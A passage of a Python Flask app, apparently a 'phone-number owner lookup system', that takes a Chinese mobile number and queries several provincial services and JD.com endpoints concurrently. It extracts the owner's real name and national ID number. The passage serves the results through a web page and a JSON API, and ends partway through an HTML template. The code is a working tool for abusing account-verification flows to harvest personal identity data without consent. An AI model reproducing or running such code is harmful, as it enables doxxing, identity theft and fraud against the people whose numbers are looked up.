                           data={'v': vt, 'o': en_o, 'enp': enp, 'inputVal': eval_val,
                                 'token': r_tok, **j_fields},
                           headers=aq_headers, timeout=JD_REQUEST_TIMEOUT)
            d9 = r9.json()
            auth_url = str(((d9.get('resultData') or {}).get('data') or {}).get('authUrl') or '')
        if not auth_url:
            return None
        au = urllib.parse.parse_qs(urllib.parse.urlparse(auth_url).query).get('authUid', [''])[0]
        if not au:
            return None
        r10 = sess.post('https://m-acp.jd.com/acp/user/getCredentialsInfo',
                        json={'clientType': 'pc', 'authUid': au},
                        headers={'Referer': 'https://aq.jd.com/', 'Origin': 'https://aq.jd.com',
                                 'Accept': 'application/json, text/plain, */*',
                                 'Content-Type': 'application/json;charset=UTF-8',
                                 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors',
                                 'Sec-Fetch-Site': 'same-site'},
                        timeout=JD_REQUEST_TIMEOUT)
        d10 = r10.json()
        if d10.get('code') == '00000' and isinstance(d10.get('data'), dict):
            name = d10['data'].get('credentialsName') or ''
            idno = d10['data'].get('credentialsNo') or ''
            if name and idno:
                return f'{name}-{idno}'
        if d10.get('code') in ('10001', '10002'):
            return '空'
        return None
    except Exception as e:
        return None

def query_jd(phone):
    province = "京东"
    if not re.match(r'^1[3-9]\d{9}$', phone):
        return province, "手机号格式错误"
    result = query_jd_requests(phone)
    if result == '空':
        return province, "未查询到信息"
    if result and '-' in result:
        name, idno = result.split('-', 1)
        return province, f"{name} {idno}"
    if result:
        return province, result
    return province, "查询失败"

# ==================== 结果有效性判断 ====================

def is_valid_result(result_str):
    """判断查询结果是否有效（包含姓名和身份证号）"""
    if not result_str or not isinstance(result_str, str):
        return False
    
    # 浙江跳转支付宝也算有效信息
    if "📱跳转支付宝" in result_str:
        return True
    
    # 失败关键词
    fail_keywords = [
        "验证码错误", "查询失败", "查询异常", "查询超时",
        "未注册", "OCR模块未安装", "加密模块未安装",
        "RSA加密失败", "验证码识别失败", "未查询到信息",
        "需要安装", "手机号格式错误", "获取会话失败",
        "span>", "span", "空", "null", "None",
        "未找到", "不存在", "发送成功", "尝试20次后仍未成功",
        "暂不支持"
    ]
    for kw in fail_keywords:
        if kw in result_str:
            return False
    
    # 检查是否包含中文（姓名）
    has_chinese = any('\u4e00' <= c <= '\u9fa5' for c in result_str)
    # 检查是否包含数字（身份证号）
    has_digit = any(c.isdigit() for c in result_str)
    # 检查是否包含星号（脱敏身份证）
    has_star = '*' in result_str
    
    # 有效条件：包含中文且（包含数字或星号）
    if has_chinese and (has_digit or has_star):
        return True
    
    # 如果结果包含常见身份证号格式（18位或15位数字，可能带X）
    id_pattern = re.compile(r'\d{17}[\dXx]|\d{15}')
    if id_pattern.search(result_str):
        return True
    
    return False

# ==================== 异步查询任务（带省份点亮） ====================

def run_query_task(task_id, phone):
    """后台执行查询任务"""
    global zhejiang_data, query_tasks
    
    print(f"\n{'='*60}")
    print(f"🔍 开始查询手机号: {phone}")
    print(f"📋 任务ID: {task_id}")
    print(f"⏰ 开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'='*60}")
    
    query_tasks[task_id] = {
        "status": "running",
        "phone": phone,
        "results": [],
        "completed_provinces": [],
        "start_time": time.time()
    }
    
    zhejiang_data = {"link": None, "qr_code": None, "phone": None}
    
    # 所有渠道并发查询（8个渠道 - 山东已屏蔽）
    funcs = [
        (query_jilin, "吉林"),
        (query_sichuan, "四川"),
        (query_anhui, "安徽"),
        (query_jiangsu, "江苏"),
        (query_hebei, "河北"),
        (query_shandong, "山东"),  # 已屏蔽，返回"暂不支持"
        (query_zhejiang, "浙江"),
        (query_jd, "京东")
    ]
    
    all_results = []
    
    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = {executor.submit(func, phone): name for func, name in funcs}
        
        for future in as_completed(futures):
            name = futures[future]
            try:
                print(f"[{name}] 查询中...")
                prov, res = future.result(timeout=REQUEST_TIMEOUT + 30)
                if isinstance(res, tuple):
                    prov, res = res
                
                # 判断结果是否有效
                if prov == "浙江" and "📱跳转支付宝" in res:
                    result_class = "success"
                elif prov == "山东":
                    result_class = "no-data"
                else:
                    is_success = is_valid_result(res)
                    if is_success:
                        result_class = "success"
                    elif "未查询到信息" in res:
                        result_class = "no-data"
                    else:
                        result_class = "failure"
                
                all_results.append({
                    "province": prov,
                    "result": res,
                    "class": result_class
                })
                
                # 记录已完成的省份（用于前端点亮）
                if prov not in query_tasks[task_id]["completed_provinces"]:
                    query_tasks[task_id]["completed_provinces"].append(prov)
                
                # 简化终端输出
                status_icon = "✅" if result_class == "success" else ("⭕" if result_class == "no-data" else "❌")
                print(f"[{prov}] {status_icon} {res}")
            except Exception as e:
                all_results.append({
                    "province": name,
                    "result": f"查询异常: {str(e)[:20]}",
                    "class": "failure"
                })
                if name not in query_tasks[task_id]["completed_provinces"]:
                    query_tasks[task_id]["completed_provinces"].append(name)
                print(f"[{name}] ❌ 查询异常")

    # 统计 - 计算成功率
    success_provinces = [item["province"] for item in all_results if item["class"] == "success"]
    success_count = len(success_provinces)
    total_count = len(all_results)
    success_rate = round((success_count / total_count) * 100, 1) if total_count > 0 else 0
    has_success = success_count > 0
    
    elapsed = time.time() - query_tasks[task_id]["start_time"]
    
    print(f"\n{'='*60}")
    print(f"✅ 完成! 成功: {success_count}/{total_count} ({success_rate}%) | 命中: {', '.join(success_provinces) if success_provinces else '无'}")
    print(f"⏱️  耗时: {elapsed:.2f}秒")
    print(f"{'='*60}\n")
    
    # 保存结果
    query_tasks[task_id] = {
        "status": "completed",
        "phone": phone,
        "results": all_results,
        "success_count": success_count,
        "total_count": total_count,
        "success_rate": success_rate,
        "success_provinces": success_provinces,
        "has_success": has_success,
        "elapsed": elapsed,
        "completed_provinces": [item["province"] for item in all_results],
        "zhejiang_link": zhejiang_data.get("link"),
        "zhejiang_qr": zhejiang_data.get("qr_code"),
        "zhejiang_alipay_scheme": zhejiang_data.get("link")
    }

# ==================== 路由 ====================

@app.route('/hz/wushuang/jz', methods=['GET'])
def query_start():
    """开始查询 - 立即返回加载页面，后台异步执行"""
    phone = request.args.get('sjh')
    
    if not phone:
        return render_template_string(LUXURY_TEMPLATE, 
                                     status_class="failure-status",
                                     status_message="❌ 请输入手机号",
                                     results=[],
                                     query_phone="",
                                     success_count=0,
                                     total_count=0,
                                     success_rate=0,
                                     success_provinces=[],
                                     zhejiang_link=None,
                                     zhejiang_qr=None,
                                     zhejiang_alipay_scheme=None)
    
    if not re.match(r'^1[3-9]\d{9}$', phone):
        return render_template_string(LUXURY_TEMPLATE, 
                                     status_class="failure-status",
                                     status_message="❌ 手机号格式不正确",
                                     results=[],
                                     query_phone=phone,
                                     success_count=0,
                                     total_count=0,
                                     success_rate=0,
                                     success_provinces=[],
                                     zhejiang_link=None,
                                     zhejiang_qr=None,
                                     zhejiang_alipay_scheme=None)
    
    # 生成任务ID
    task_id = f"{phone}_{int(time.time())}"
    
    # 启动后台任务
    thread = threading.Thread(target=run_query_task, args=(task_id, phone))
    thread.daemon = True
    thread.start()
    
    # 返回等待页面
    return render_template_string(WAITING_TEMPLATE, phone=phone, task_id=task_id)


@app.route('/api/query/status/<task_id>')
def query_status(task_id):
    """获取查询状态"""
    if task_id not in query_tasks:
        return jsonify({"status": "not_found"})
    
    return jsonify(query_tasks[task_id])


@app.route('/hz/wushuang/result/<task_id>')
def query_result(task_id):
    """显示查询结果"""
    if task_id not in query_tasks:
        return "任务不存在或已过期", 404
    
    data = query_tasks[task_id]
    
    if data["status"] != "completed":
        return render_template_string(WAITING_TEMPLATE, phone=data["phone"], task_id=task_id)
    
    has_success = data["has_success"]
    status_msg = f"✅ 查询成功，共找到 {data['success_count']} 条有效信息" if has_success else "❌ 所有渠道均未查询到信息"
    
    return render_template_string(LUXURY_TEMPLATE, 
                                 status_class="success-status" if has_success else "failure-status",
                                 status_message=status_msg,
                                 results=data["results"],
                                 query_phone=data["phone"],
                                 success_count=data["success_count"],
                                 total_count=data["total_count"],
                                 success_rate=data["success_rate"],
                                 success_provinces=data["success_provinces"],
                                 zhejiang_link=data.get("zhejiang_link"),
                                 zhejiang_qr=data.get("zhejiang_qr"),
                                 zhejiang_alipay_scheme=data.get("zhejiang_alipay_scheme"))


@app.route('/api/hz/wushuang/jz', methods=['GET'])
def query_all_api():
    phone = request.args.get('sjh') 
    if not phone:
        return jsonify({"error": "手机号参数缺失", "code": 400}), 400

    if not re.match(r'^1[3-9]\d{9}$', phone):
        return jsonify({"error": "手机号格式不正确", "code": 400}), 400

    print(f"API查询: {phone}")
    
    results_dict = {}
    funcs = [
        (query_jilin, "吉林"),
        (query_sichuan, "四川"),
        (query_anhui, "安徽"),
        (query_jiangsu, "江苏"),
        (query_hebei, "河北"),
        (query_shandong, "山东"),
        (query_zhejiang, "浙江"),
        (query_jd, "京东")
    ]

    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = {executor.submit(func, phone): name for func, name in funcs}

        for future in as_completed(futures):
            name = futures[future]
            try:
                prov, res = future.result(timeout=REQUEST_TIMEOUT + 30)
                results_dict[prov] = res
            except Exception as e:
                results_dict[name] = f"查询异常"

    success_count = sum(1 for result in results_dict.values() if is_valid_result(result))
    total_count = len(results_dict)
    success_rate = round((success_count / total_count) * 100, 1) if total_count > 0 else 0
    
    return app.response_class(
        response=json.dumps({
            "phone": phone,
            "results": results_dict,
            "success_count": success_count,
            "total_count": total_count,
            "success_rate": success_rate,
            "message": f"查询成功，共找到 {success_count} 条有效信息" if success_count > 0 else "所有渠道均未查询到信息"
        }, ensure_ascii=False, indent=2),
        mimetype='application/json'
    )


@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template_string(LUXURY_HOMEPAGE)


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


# ==================== 模板（省略，保持原样） ====================

WAITING_TEMPLATE = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>查询中</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
        body{
            background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
            min-height:100vh;
            display:flex;
            justify-content:center;
            align-items:center;
            color:#e0e0e0
        }
        .container{
            text-align:center;
            padding:40px 30px;
            background:rgba(255,255,255,0.05);
            border-radius:24px;
            backdrop-filter:blur(20px);
            border:1px solid rgba(255,255,255,0.1);
            max-width:500px;
            width:90%;
            animation:fadeIn 0.5s ease
        }
        @keyframes fadeIn{
            from{opacity:0;transform:translateY(30px) scale(0.95)}
            to{opacity:1;transform:translateY(0) scale(1)}
        }
        .title{
            font-size:28px;
            color:#00d2ff;
            margin-bottom:8px;
            font-weight:700
        }
        .phone{
            font-size:22px;
            color:#fff;
            margin-bottom:20px;
            padding:12px 20px;
            background:rgba(255,255,255,0.08);
            border-radius:12px;
            display:inline-block;
            letter-spacing:2px
        }
        .text{
            color:#888;
            font-size:15px;
            margin-bottom:8px
        }
        .text i{
            color:#00d2ff;
            margin-right:6px
        }
        .channels{
            display:flex;
            flex-wrap:wrap;
            justify-content:center;
            gap:10px;
            margin:20px 0 10px 0;
            padding:10px 0
        }
        .channels span{
            background:rgba(255,255,255,0.06);
            padding:6px 16px;
            border-radius:20px;
            font-size:13px;
            color:#555;
            border:1px solid rgba(255,255,255,0.08);
            transition:all 0.6s ease;
            font-weight:500;
            letter-spacing:0.5px;
            min-width:52px
        }
        .channels span.completed{
            background:rgba(0,210,255,0.25);
            color:#00d2ff;
            border-color:rgba(0,210,255,0.4);
            box-shadow:0 0 20px rgba(0,210,255,0.2);
            transform:scale(1.05);
            animation:glowPulse 0.8s ease
        }
        @keyframes glowPulse{
            0%{transform:scale(1)}
            40%{transform:scale(1.12);background:rgba(0,210,255,0.35)}
            100%{transform:scale(1.05)}
        }
        .progress-text{
            font-size:14px;
            color:#666;
            margin-top:5px
        }
        .progress-text .count{
            color:#00d2ff;
            font-weight:bold;
            font-size:18px
        }
        .bar{
            width:100%;
            height:4px;
            background:rgba(255,255,255,0.1);
            border-radius:2px;
            overflow:hidden;
            margin-top:16px
        }
        .bar-inner{
            width:100%;
            height:100%;
            background:linear-gradient(90deg,#00d2ff,#3a7bd5,#00d2ff);
            background-size:200% 100%;
            animation:progress 1.5s ease-in-out infinite
        }
        @keyframes progress{
            0%{background-position:200% 0}
            100%{background-position:-200% 0}
        }
        .id{
            color:#444;
            font-size:11px;
            margin-top:16px
        }
        .back-link{
            display:inline-block;
            margin-top:14px;
            color:#666;
            text-decoration:none;
            font-size:13px;
            padding:8px 20px;
            border:1px solid rgba(255,255,255,0.1);
            border-radius:20px;
            transition:all 0.3s
        }
        .back-link:hover{
            background:rgba(255,255,255,0.05);
            color:#fff
        }
        .elapsed{
            color:#555;
            font-size:13px;
            margin-top:10px
        }
        .disabled-info{
            background:rgba(255,193,7,0.15);
            border:1px solid rgba(255,193,7,0.3);
            border-radius:10px;
            padding:8px 12px;
            margin-top:10px;
            font-size:13px;
            color:#ffc107
        }
    </style>
</head>
<body>
<div class="container">
    <div class="title">🔍 查询中</div>
    <div class="phone">📱 {{ phone }}</div>
    <div class="text"><i class="fas fa-server"></i> 正在并发查询 8 个渠道</div>
    <div class="text" style="font-size:12px;color:#555;">江苏渠道最多重试20次，可能需要较长时间</div>
    <div class="disabled-info">⚠️ 山东渠道已暂时屏蔽（云环境不支持）</div>
    
    <div class="channels" id="channelList">
        <span data-province="吉林">吉林</span>
        <span data-province="四川">四川</span>
        <span data-province="安徽">安徽</span>
        <span data-province="江苏">江苏</span>
        <span data-province="河北">河北</span>
        <span data-province="山东" style="opacity:0.5;">山东🚫</span>
        <span data-province="浙江">浙江</span>
        <span data-province="京东">京东</span>
    </div>
    <div class="progress-text">已点亮 <span class="count" id="countNum">0</span> / 8 个渠道</div>
    
    <div class="bar"><div class="bar-inner"></div></div>
    <div class="elapsed" id="elapsedTime">⏱️ 已等待 0 秒</div>
    <div class="id">任务ID: {{ task_id }}</div>
    <a href="/" class="back-link"><i class="fas fa-arrow-left"></i> 返回首页</a>
</div>
<script>
var taskId = "{{ task_id }}";
var elapsedTime = document.getElementById('elapsedTime');
var countNum = document.getElementById('countNum');
var startTime = Date.now();

var elapsedInterval = setInterval(function() {
    var seconds = Math.floor((Date.now() - startTime) / 1000);
    elapsedTime.textContent = '⏱️ 已等待 ' + seconds + ' 秒';
}, 1000);

function updateChannels(completedProvinces) {
    var spans = document.querySelectorAll('#channelList span');
    var count = 0;
    spans.forEach(function(span) {
        var province = span.getAttribute('data-province');
        // 山东不计入点亮
        if (province === '山东') return;
        if (completedProvinces && completedProvinces.indexOf(province) !== -1) {
            if (!span.classList.contains('completed')) {
                span.classList.add('completed');
            }
            count++;
        }
    });
    if (countNum) {
        countNum.textContent = count;
    }
}

var checkInterval = setInterval(function() {
    fetch('/api/query/status/' + taskId)
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data.status === 'completed') {
                clearInterval(checkInterval);
                clearInterval(elapsedInterval);
                var spans = document.querySelectorAll('#channelList span');
                spans.forEach(function(span) {
                    var province = span.getAttribute('data-province');
                    if (province !== '山东') {
                        span.classList.add('completed');
                    }
                });
                if (countNum) {
                    countNum.textContent = '7';
                }
                document.querySelector('.container').style.transition = 'opacity 0.5s ease';
                document.querySelector('.container').style.opacity = '0';
                setTimeout(function() {
                    window.location.href = '/hz/wushuang/result/' + taskId;
                }, 600);
            } else if (data.status === 'running') {
                if (data.completed_provinces) {
                    updateChannels(data.completed_provinces);
                }
            }
        })
        .catch(function() {});
}, 1500);
</script>
</body>
</html>
"""

LUXURY_TEMPLATE = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>手机号查询结果 - 3.1</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { 
            background: linear-gradient(135deg, #00b4d8 0%, #90e0ef 30%, #ffd700 80%, #ffaa00 100%);
            min-height: 100vh; 
            padding: 20px; 
            color: #333; 
        }
        .container { 
            width: 100%; 
            max-width: 1300px; 
            margin: 0 auto; 
            background: rgba(255, 255, 255, 0.93); 
            border-radius: 20px; 
            overflow: hidden; 
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.3); 
            padding: 0 0 10px 0;
            backdrop-filter: blur(5px);
        }
        
        .header { 
            background: linear-gradient(135deg, #0077b6 0%, #00b4d8 50%, #90e0ef 100%);
            color: white; 
            padding: 30px 35px; 
            text-align: center; 
            position: relative;
            overflow: hidden;
        }
        .header::before { 
            content: ''; 
            position: absolute; 
            top: -50%; 
            left: -50%; 
            width: 200%; 
            height: 200%; 
            background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, transparent 70%); 
            animation: headerRotate 25s linear infinite; 
        }
        @keyframes headerRotate { 
            0% { transform: rotate(0deg) scale(1); } 
            50% { transform: rotate(180deg) scale(1.1); } 
            100% { transform: rotate(360deg) scale(1); } 
        }
        .header h1 { 
            font-size: 30px; 
            margin-bottom: 4px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            gap: 14px; 
            position: relative;
            z-index: 1;
        }
        .header h1 i { font-size: 32px; }
        .header .version { 
            font-size: 14px; 
            background: rgba(255,255,255,0.2); 
            padding: 2px 12px; 
            border-radius: 16px; 
            border: 1px solid rgba(255,255,255,0.3);
        }
        .header p { 
            font-size: 16px; 
            opacity: 0.9; 
            position: relative;
            z-index: 1;
        }
        
        .query-box { 
            background: white; 
            padding: 22px 30px; 
            border-radius: 14px; 
            margin: 20px 28px 12px 28px; 
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06); 
        }
        .query-form { display: flex; gap: 14px; align-items: center; }
        .query-input { 
            flex: 1; 
            padding: 14px 20px; 
            border: 2px solid #e0e0e0; 
            border-radius: 10px; 
            font-size: 16px; 
            outline: none; 
            background: #f8f9fa; 
            transition: all 0.3s; 
        }
        .query-input:focus { 
            border-color: #0077b6; 
            box-shadow: 0 0 0 3px rgba(0, 119, 182, 0.2); 
            background: white; 
        }
        .query-btn { 
            background: linear-gradient(135deg, #0077b6 0%, #00b4d8 100%); 
            color: white; 
            border: none; 
            border-radius: 10px; 
            padding: 14px 32px; 
            font-size: 16px; 
            font-weight: 600; 
            cursor: pointer; 
            display: flex; 
            align-items: center; 
            gap: 8px; 
            white-space: nowrap; 
            box-shadow: 0 4px 15px rgba(0, 119, 182, 0.3); 
            transition: all 0.3s; 
        }
        .query-btn:hover { 
            transform: translateY(-2px); 
            box-shadow: 0 8px 25px rgba(0, 119, 182, 0.4); 
        }
        
        .results-container { padding: 5px 28px 15px; }
        
        .status-box { 
            text-align: center; 
            padding: 12px; 
            margin: 5px 0 10px 0; 
            border-radius: 12px; 
            font-weight: bold; 
            font-size: 17px; 
        }
        .success-status { 
            background: linear-gradient(135deg, #d4edda, #c3e6cb); 
            color: #0d6e1a; 
            border: 1px solid #b8d4b9; 
        }
        .failure-status { 
            background: linear-gradient(135deg, #f8d7da, #f5c6cb); 
            color: #721c24; 
            border: 1px solid #f1b0b5; 
        }
        .stats-box { 
            background: #e9ecef; 
            padding: 10px 16px; 
            border-radius: 10px; 
            margin: 6px 0 12px 0; 
            text-align: center; 
            font-size: 14px; 
        }
        .stats-highlight { font-weight: bold; color: #0d6e1a; font-size: 17px; }
        .success-provinces { 
            color: #0d6e1a; 
            font-weight: bold; 
            margin-top: 3px; 
            font-size: 15px; 
        }
        
        .results-grid { 
            display: grid; 
            grid-template-columns: repeat(4, 1fr); 
            gap: 12px; 
            margin-top: 12px; 
        }
        .result-card { 
            background: white; 
            border-radius: 12px; 
            padding: 14px 10px; 
            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.07); 
            border-left: 5px solid; 
            transition: all 0.3s; 
            min-height: 72px; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
        }
        .result-card:hover { 
            transform: translateY(-3px); 
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12); 
        }
        .result-card.success { 
            border-left-color: #28a745; 
            background: linear-gradient(to right, #f8fff9, #ffffff); 
        }
        .result-card.failure { 
            border-left-color: #dc3545; 
            background: linear-gradient(to right, #fff8f8, #ffffff); 
        }
        .result-card.no-data { 
            border-left-color: #6c757d; 
            background: linear-gradient(to right, #f8f9fa, #ffffff); 
        }
        .result-card.jd { 
            border-left-color: #e1251b; 
            background: linear-gradient(to right, #fff5f5, #ffffff); 
            position: relative; 
        }
        .result-card.jd::before { 
            content: "优先"; 
            position: absolute; 
            top: 4px; 
            right: 6px; 
            background: #e1251b; 
            color: white; 
            font-size: 9px; 
            padding: 1px 7px; 
            border-radius: 4px; 
        }
        .result-card.shandong-disabled { 
            border-left-color: #ffc107; 
            background: linear-gradient(to right, #fffbf0, #ffffff); 
            opacity: 0.7;
        }
        .province { 
            font-weight: bold; 
            font-size: 14px; 
            margin-bottom: 4px; 
            display: flex; 
            align-items: center; 
            gap: 6px; 
        }
        .result { 
            font-size: 12px; 
            color: #0d6e1a; 
            word-break: break-all; 
            line-height: 1.3; 
        }
        .result a { 
            color: #0d6e1a; 
            text-decoration: underline; 
            word-break: break-all; 
        }
        
        .zhejiang-section { 
            margin-top: 12px; 
            padding: 14px 20px; 
            background: linear-gradient(135deg, #f0f8ff, #e8f4f8); 
            border-radius: 12px; 
            border-left: 5px solid #0077b6; 
            display: flex; 
            flex-wrap: wrap; 
            align-items: center; 
            gap: 16px; 
        }
        .zhejiang-section .info { flex: 1; min-width: 200px; }
        .zhejiang-section .info h3 { 
            color: #0d6e1a; 
            margin-bottom: 4px; 
            font-size: 16px; 
        }
        .zhejiang-section .info p { margin: 2px 0; font-size: 13px; }
        .zhejiang-section .info .url { 
            word-break: break-all; 
            color: #0d6e1a; 
            font-size: 12px; 
            background: rgba(255,255,255,0.7); 
            padding: 4px 8px; 
            border-radius: 6px;
            font-family: monospace;
            max-height: 44px;
            overflow-y: auto;
        }
        .zhejiang-section .info .url a { color: #0d6e1a; text-decoration: none; }
        
        .zhejiang-section .qr-code { 
            flex-shrink: 0; 
            background: white; 
            padding: 6px; 
            border-radius: 10px; 
            box-shadow: 0 3px 15px rgba(0,0,0,0.08); 
            cursor: pointer;
            transition: transform 0.2s;
            display: inline-block;
        }
        .zhejiang-section .qr-code:hover { transform: scale(1.02); }
        .zhejiang-section .qr-code img { 
            width: 110px; 
            height: 110px; 
            display: block; 
        }
        
        .qr-modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.75);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            animation: fadeInModal 0.3s;
        }
        .qr-modal.active { display: flex; }
        @keyframes fadeInModal {
            from { opacity: 0; transform: scale(0.8); }
            to { opacity: 1; transform: scale(1); }
        }
        .qr-modal-content {
            background: white;
            padding: 20px;
            border-radius: 20px;
            position: relative;
            max-width: 90vw;
            max-height: 90vh;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            cursor: pointer;
        }
        .qr-modal-content img {
            display: block;
            width: 450px;
            height: 450px;
            object-fit: contain;
            cursor: pointer;
        }
        .qr-modal-hint {
            text-align: center;
            color: #888;
            font-size: 12px;
            margin-top: 8px;
            padding-top: 8px;
            border-top: 1px solid #e9ecef;
        }
        
        @media (max-width: 600px) {
            .qr-modal-content img { width: 75vw; height: 75vw; }
        }
        
        .footer { 
            text-align: center; 
            padding: 15px; 
            background: #f8f9fa; 
            border-top: 1px solid #e9ecef; 
            color: #6c757d; 
            margin-top: 12px; 
            font-size: 13px; 
        }
        .footer a { color: #0077b6; text-decoration: none; font-weight: 500; }
        
        .disabled-badge {
            display: inline-block;
            background: #ffc107;
            color: #333;
            font-size: 9px;
            padding: 1px 6px;
            border-radius: 4px;
            margin-left: 4px;
        }
        
        @media (max-width: 1200px) { 
            .results-grid { grid-template-columns: repeat(4, 1fr); }
            .container { max-width: 100%; padding: 0; }
        }
        @media (max-width: 992px) { 
            .results-grid { grid-template-columns: repeat(4, 1fr); gap: 10px; }
        }
        @media (max-width: 768px) { 
            .query-form { flex-direction: column; } 
            .query-btn { width: 100%; justify-content: center; } 
            .results-grid { grid-template-columns: repeat(2, 1fr); gap: 8px; } 
            .zhejiang-section { flex-direction: column; text-align: center; }
            .zhejiang-section .qr-code img { width: 90px; height: 90px; margin: 0 auto; }
            .container { max-width: 100%; border-radius: 16px; }
            .header { padding: 18px 20px; }
            .query-box { margin: 15px; padding: 15px; }
            .results-container { padding: 5px 12px 12px; }
        }
        @media (max-width: 480px) { 
            .results-grid { grid-template-columns: repeat(2, 1fr); }
            .result-card { min-height: 60px; padding: 10px 8px; }
            .province { font-size: 12px; }
            .result { font-size: 11px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>
                <i class="fas fa-mobile-alt"></i> 手机号机主查询系统
                <span class="version">5.2</span>
            </h1>
            <p>7省联合查询 · 山东已屏蔽</p>
        </div>
        <div class="query-box">
            <form method="GET" action="/hz/wushuang/jz" class="query-form" id="queryForm">
                <input type="text" class="query-input" name="sjh" id="phoneInput" placeholder="请输入11位手机号码" value="{{ query_phone or '' }}" required pattern="[0-9]{11}" maxlength="11">
                <button type="submit" class="query-btn" id="queryBtn"><i class="fas fa-search"></i> 查询</button>
            </form>
        </div>
        <div class="results-container">
            <div class="status-box {{ status_class }}" id="statusBox">
                <i class="fas {% if success_count > 0 %}fa-check-circle{% else %}fa-times-circle{% endif %}"></i> 
                {{ status_message }}
            </div>
            {% if total_count > 0 %}
            <div class="stats-box" id="statsBox">
                <div style="display:flex;gap:30px;justify-content:center;flex-wrap:wrap;">
                    <div><span class="stats-highlight">{{ success_count }}</span> 个渠道成功</div>
                    <div><span class="stats-highlight">{{ total_count }}</span> 个查询渠道</div>
                    <div><span class="stats-highlight">{{ success_rate }}%</span> 查询成功率</div>
                    <div><span class="stats-highlight">{{ success_provinces | join('、') if success_provinces else '无' }}</span> 命中省份</div>
                </div>
            </div>
            {% endif %}
            
            {% if results %}
            <div class="results-grid" id="resultsGrid">
                {% for item in results %}
                <div class="result-card 
                    {% if item.province == '山东' %}shandong-disabled{% endif %}
                    {{ item.class }} 
                    {% if item.province == '京东' %}jd{% endif %}">
                    <div class="province">
                        <i class="fas {% if item.province == '京东' %}fa-shopping-cart{% else %}fa-map-marker-alt{% endif %}"></i> 
                        {{ item.province }}
                        {% if item.province == '山东' %}<span class="disabled-badge">暂不支持</span>{% endif %}
                    </div>
                    <div class="result">
                        {% if item.province == '浙江' and '📱跳转支付宝' in item.result %}
                            <span style="color:#ff9800;">📱 支付宝刷脸</span>
                        {% else %}
                            {{ item.result }}
                        {% endif %}
                    </div>
                </div>
                {% endfor %}
            </div>
            {% endif %}
            
            <!-- 浙江二维码 -->
            {% if zhejiang_link and zhejiang_qr %}
            <div class="zhejiang-section">
                <div class="info">
                    <h3><i class="fas fa-qrcode"></i> 浙江刷脸验证</h3>
                    <p>手机号：<strong>{{ query_phone }}</strong></p>
                    <div class="url">
                        <a href="{{ zhejiang_link }}" target="_blank">{{ zhejiang_link }}</a>
                    </div>
                    <p style="font-size: 12px; color: #888; margin-top: 3px;">💡 点击二维码放大，再次点击还原</p>
                </div>
                <div class="qr-code" id="qrCodeContainer">
                    <img src="data:image/png;base64,{{ zhejiang_qr }}" alt="浙江刷脸二维码" id="qrImage">
                </div>
            </div>
            {% endif %}
        </div>
        <div class="footer">
            <p>7省联合 · 京东金融 · 全部内置 &nbsp;|&nbsp; API接口：<a href="/api/hz/wushuang/jz?sjh={{ query_phone }}">/api/hz/wushuang/jz?sjh={{ query_phone }}</a></p>
            <p style="color:#999;font-size:11px;margin-top:4px;">⚠️ 山东渠道已屏蔽（云环境不支持Selenium）</p>
        </div>
    </div>
    
    <div class="qr-modal" id="qrModal">
        <div class="qr-modal-content" id="qrModalContent">
            <img src="data:image/png;base64,{{ zhejiang_qr }}" alt="放大二维码" id="qrModalImg">
            <div class="qr-modal-hint">点击图片还原</div>
        </div>
    </div>
    
    <script>
        var qrImage = document.getElementById('qrImage');
        var qrModal = document.getElementById('qrModal');
        var qrModalImg = document.getElementById('qrModalImg');
        var qrModalContent = document.getElementById('qrModalContent');
        
        if (qrImage) {
            qrImage.parentElement.addEventListener('click', function() {
                qrModal.classList.add('active');
            });
        }
        
        qrModalContent.addEventListener('click', function(e) {
            qrModal.classList.remove('active');
        });
        
        qrModal.addEventListener('click', function(e) {
            if (e.target === this) {
                qrModal.classList.remove('active');
            }
        });
        
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' && qrModal.classList.contains('active')) {
                qrModal.classList.remove('active');
            }
        });
        
        document.getElementById('queryForm').addEventListener('submit', function() {
            document.getElementById('queryBtn').disabled = true;
            document.getElementById('queryBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> 查询中...';
        });
        
        document.querySelector('.query-input').focus();
        
        document.querySelector('.query-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') { 
                this.form.submit(); 
            }
        });
    </script>
</body>
</html>
"""

LUXURY_HOMEPAGE = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>手机号机主查询系统5.2</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
